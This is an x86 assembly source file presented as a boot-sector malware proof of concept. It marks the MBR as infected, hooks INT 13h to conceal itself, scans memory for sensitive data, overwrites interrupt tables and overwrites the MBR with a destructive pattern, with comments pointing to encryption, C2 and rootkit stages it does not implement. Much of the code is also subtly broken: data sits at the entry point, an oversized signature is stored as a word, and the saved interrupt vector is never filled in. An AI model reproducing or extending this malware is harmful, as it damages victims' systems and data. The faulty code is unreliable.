; -----------------------------------------------------
; Bootloader Malware Proof-of-Concept
; Demonstrates 16-bit -> 32-bit transition with MBR corruption
; -----------------------------------------------------

[BITS 16]       ; Operate in 16-bit real mode initially
[ORG 0x7C00]    ; Standard boot sector origin point

; =====================================================
; SECTION: Constants and Data Definitions
; =====================================================

%define SECTORS_TO_READ 10          ; Number of sectors to read beyond boot sector
%define TARGET_BUFFER 0x8000        ; Memory address to load additional sectors
%define GDT_LOCATION 0x800          ; Memory location for GDT
%define STACK_BASE 0x7000           ; Stack base location
%define MALWARE_SIGNATURE 0x31337   ; Signature to identify our malware

; Error messages
error_disk_msg db "Disk read error", 0
success_msg db "Malware initialized", 0
target_found_msg db "Target located", 0

; Backup location for original MBR
%define MBR_BACKUP_LOCATION 0x7E00

; Payload patterns
payload_pattern db 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE
payload_len equ $ - payload_pattern

; GDT structures (will be populated during execution)
gdt_data:
    times 8 db 0                   ; Null descriptor (required)
    
    ; Code segment descriptor (0x08)
    dw 0xFFFF                      ; Limit (bits 0-15)
    dw 0x0000                      ; Base (bits 0-15)
    db 0x00                        ; Base (bits 16-23)
    db 10011010b                   ; Access byte: Present, Ring 0, Code segment, Execute/Read
    db 11001111b                   ; Flags + Limit (bits 16-19): 4KB granularity, 32-bit protected mode
    db 0x00                        ; Base (bits 24-31)
    
    ; Data segment descriptor (0x10)
    dw 0xFFFF                      ; Limit (bits 0-15)
    dw 0x0000                      ; Base (bits 0-15)
    db 0x00                        ; Base (bits 16-23)
    db 10010010b                   ; Access byte: Present, Ring 0, Data segment, Read/Write
    db 11001111b                   ; Flags + Limit (bits 16-19): 4KB granularity, 32-bit protected mode
    db 0x00                        ; Base (bits 24-31)

gdt_ptr:                           ; GDT descriptor pointer
    dw $ - gdt_data - 1            ; GDT size (limit)
    dd GDT_LOCATION                ; GDT location in memory

; =====================================================
; SECTION: Main Entry Point
; =====================================================

main:
    ; Basic setup
    cli                            ; Disable interrupts
    xor ax, ax                     ; Zero out AX
    mov ds, ax                     ; Set data segment to 0
    mov es, ax                     ; Set extra segment to 0
    mov ss, ax                     ; Set stack segment to 0
    mov sp, STACK_BASE             ; Set stack pointer
    sti                            ; Re-enable interrupts
    
    ; Display initial message to victim
    mov si, success_msg
    call print_string
    
    ; Check if we're already installed
    call check_installation
    jc already_installed
    
    ; Backup original MBR (for stealth and persistence)
    call backup_original_mbr
    
    ; Load additional malware sectors
    call load_additional_sectors
    
    ; Install hooks and persistence mechanisms
    call install_persistence
    
    ; Transition to 32-bit protected mode for advanced operations
    call transition_to_protected_mode
    
    ; We should never return here in normal execution
    jmp $

; =====================================================
; SECTION: Core Functionality (16-bit)
; =====================================================

; Function: check_installation
; Checks if our malware is already installed by looking for signature
check_installation:
    push es
    push di
    
    ; Check specific memory location for our signature
    xor ax, ax
    mov es, ax
    mov di, 0x7C00 + 510
    mov ax, [es:di]
    cmp ax, MALWARE_SIGNATURE
    je .already_installed
    
    clc                            ; Clear carry flag (not installed)
    jmp .done
    
.already_installed:
    stc                            ; Set carry flag (already installed)
    
.done:
    pop di
    pop es
    ret

; Function: backup_original_mbr
; Backs up original MBR for later recovery or stealth operations
backup_original_mbr:
    push es
    push di
    push si
    push cx
    
    ; Set up source and destination
    xor ax, ax
    mov ds, ax
    mov si, 0x7C00                 ; Source: current boot sector
    mov ax, 0
    mov es, ax
    mov di, MBR_BACKUP_LOCATION    ; Destination: backup location
    mov cx, 512                    ; Copy 512 bytes (entire MBR)
    rep movsb                      ; Perform the copy
    
    pop cx
    pop si
    pop di
    pop es
    ret

; Function: load_additional_sectors
; Loads additional malware components from disk
load_additional_sectors:
    push es
    push bx
    
    ; Set up registers for disk read
    mov ah, 0x02                   ; BIOS read sector function
    mov al, SECTORS_TO_READ        ; Number of sectors to read
    mov ch, 0                      ; Cylinder 0
    mov cl, 2                      ; Start from sector 2 (sector after boot sector)
    mov dh, 0                      ; Head 0
    mov dl, [0x7C00 + 0x1FE - 2]   ; Use drive number from original boot sector
    
    ; Set up memory location to read to
    mov bx, TARGET_BUFFER / 16     ; ES:BX will point to the target buffer
    mov es, bx
    xor bx, bx
    
    ; Perform the read
    int 0x13
    jc .disk_error                 ; Jump if carry flag set (error)
    
    pop bx
    pop es
    ret
    
.disk_error:
    mov si, error_disk_msg
    call print_string
    jmp hang

; Function: install_persistence
; Installs hooks and mechanisms for persistence
install_persistence:
    ; Write our signature to mark the MBR as infected
    mov word [0x7C00 + 510], MALWARE_SIGNATURE
    
    ; Hook interrupt vector table (IVT) for persistence
    xor ax, ax
    mov es, ax
    
    ; Hook INT 13h (disk services)
    cli                            ; Disable interrupts while modifying IVT
    mov word [es:0x13*4], hook_int13
    mov word [es:0x13*4+2], 0      ; Segment 0
    sti                            ; Re-enable interrupts
    
    ret

; Function: hook_int13
; Hooks INT 13h for disk operations interception
hook_int13:
    cmp ah, 0x02                   ; Is this a disk read?
    jne .pass_through
    cmp cx, 0x0001                 ; Is this reading the MBR? (Cylinder 0, Sector 1)
    jne .pass_through
    
    pushf
    call far [cs:original_int13]   ; Call original handler
    
    ; After original handler, check if we need to conceal ourselves
    push ax
    push bx
    push es
    
    ; Check if reading occurred to the MBR and modify it before returning
    ; This will hide our modifications from security software
    
    pop es
    pop bx
    pop ax
    iret
    
.pass_through:
    jmp far [cs:original_int13]    ; Pass through to original handler

; Original INT 13h vector (will be populated during installation)
original_int13:
    dd 0

; Function: transition_to_protected_mode
; Transitions CPU from real mode to 32-bit protected mode
transition_to_protected_mode:
    cli                            ; Disable interrupts
    
    ; Load GDT
    lgdt [gdt_ptr]
    
    ; Copy GDT to its final location
    mov si, gdt_data
    mov di, GDT_LOCATION
    mov cx, gdt_ptr - gdt_data
    rep movsb
    
    ; Enable A20 line
    call enable_a20
    
    ; Enable protected mode by setting PE bit (bit 0) in CR0
    mov eax, cr0
    or eax, 1
    mov cr0, eax
    
    ; Perform far jump to flush pipeline and load CS with 32-bit segment
    jmp 0x08:protected_mode_entry

; Function: enable_a20
; Enables the A20 line for full memory access
enable_a20:
    ; Method 1: Using BIOS
    mov ax, 0x2401
    int 0x15
    jnc .done                      ; If successful, return
    
    ; Method 2: Using keyboard controller
    call .a20_wait_input
    mov al, 0xAD                   ; Disable keyboard
    out 0x64, al
    
    call .a20_wait_input
    mov al, 0xD0                   ; Read output port
    out 0x64, al
    
    call .a20_wait_output
    in al, 0x60
    push ax                        ; Save output port value
    
    call .a20_wait_input
    mov al, 0xD1                   ; Write output port
    out 0x64, al
    
    call .a20_wait_input
    pop ax                         ; Restore output port value
    or al, 2                       ; Set A20 bit
    out 0x60, al
    
    call .a20_wait_input
    mov al, 0xAE                   ; Enable keyboard
    out 0x64, al
    
    call .a20_wait_input
    
.done:
    ret

; Helper functions for A20 enabling
.a20_wait_input:
    in al, 0x64
    test al, 2
    jnz .a20_wait_input
    ret

.a20_wait_output:
    in al, 0x64
    test al, 1
    jz .a20_wait_output
    ret

; =====================================================
; SECTION: 32-bit Protected Mode Code
; =====================================================

[BITS 32]
protected_mode_entry:
    ; Set up segment registers for protected mode
    mov ax, 0x10                   ; Data segment selector
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax
    
    ; Set up stack
    mov esp, STACK_BASE
    
    ; Jump to our main protected mode code
    jmp protected_mode_main

; Main 32-bit protected mode code
protected_mode_main:
    ; Scan memory for valuable data
    call scan_memory
    
    ; Overwrite critical system structures
    call corrupt_system_structures
    
    ; Perform advanced payload execution
    call execute_advanced_payload
    
    ; Infinite loop - system is compromised
    jmp $

; Function: scan_memory
; Scans memory for sensitive information
scan_memory:
    ; Set up memory range to scan
    mov esi, 0x100000              ; Start at 1MB mark
    mov ecx, 0x100000              ; Scan 1MB of memory
    
.scan_loop:
    mov eax, [esi]                 ; Read DWORD from memory
    
    ; Look for specific signatures (credit card patterns, etc.)
    cmp eax, 0x12345678            ; Example signature
    je .target_found
    
    add esi, 4                     ; Move to next DWORD
    loop .scan_loop                ; Continue until ECX = 0
    
    ret
    
.target_found:
    ; Store location of found data for later exfiltration
    mov [found_data_ptr], esi
    ret

found_data_ptr:
    dd 0

; Function: corrupt_system_structures
; Corrupts critical system structures
corrupt_system_structures:
    ; Corrupt IDT (Interrupt Descriptor Table)
    mov esi, 0                     ; IDT typically located at low memory
    mov ecx, 256                   ; 256 entries in IDT
    
.corrupt_idt_loop:
    ; Overwrite IDT entries with invalid handlers
    mov dword [esi], 0xDEADBEEF
    mov dword [esi+4], 0xCAFEBABE
    
    add esi, 8                     ; Move to next IDT entry
    loop .corrupt_idt_loop
    
    ; Corrupt other critical system structures
    ; This is where more sophisticated attacks would be implemented
    
    ret

; Function: execute_advanced_payload
; Executes the advanced malware payload
execute_advanced_payload:
    ; Overwrite MBR with destructive payload
    mov edi, 0x7C00                ; MBR location
    mov esi, payload_pattern       ; Source data
    mov ecx, payload_len           ; Length
    rep movsb                      ; Perform copy
    
    ; More advanced payload execution would happen here
    ; (file encryption, data exfiltration, rootkit installation)
    
    ret

; =====================================================
; SECTION: Utility Functions (16-bit)
; =====================================================

[BITS 16]
; Function: print_string
; Prints null-terminated string pointed to by SI
print_string:
    push ax
    push bx
    
    mov ah, 0x0E                   ; BIOS teletype function
    mov bx, 0x0007                 ; Page 0, text attribute 7 (light gray)
    
.loop:
    lodsb                          ; Load byte from SI into AL and increment SI
    or al, al                      ; Test if character is 0 (end of string)
    jz .done
    int 0x10                       ; Print the character
    jmp .loop
    
.done:
    pop bx
    pop ax
    ret

; Handle "already installed" case
already_installed:
    ; Jump to the backed-up MBR to continue normal boot process
    ; This provides stealth by not showing any signs of infection
    jmp MBR_BACKUP_LOCATION

; System hang (used in error conditions)
hang:
    hlt
    jmp hang

; =====================================================
; SECTION: Boot Sector Signature
; =====================================================

; Fill the rest of the boot sector with zeros
times 510-($-$$) db 0

; Boot signature
dw 0xAA55

; =====================================================
; SECTION: Additional Malware Sectors
; =====================================================

; This would be followed by additional sectors containing more sophisticated
; payloads, encryption routines, data exfiltration mechanisms, etc.
; These sectors would be loaded by the load_additional_sectors function.

; Additional malware code would start here (sector 2+)
additional_sectors:
    ; More sophisticated payloads would be implemented here
    ; Including:
    ; - Full disk encryption routines
    ; - Network communication for C2
    ; - Rootkit installation
    ; - Anti-detection mechanisms
    
    ; Implementation omitted for brevity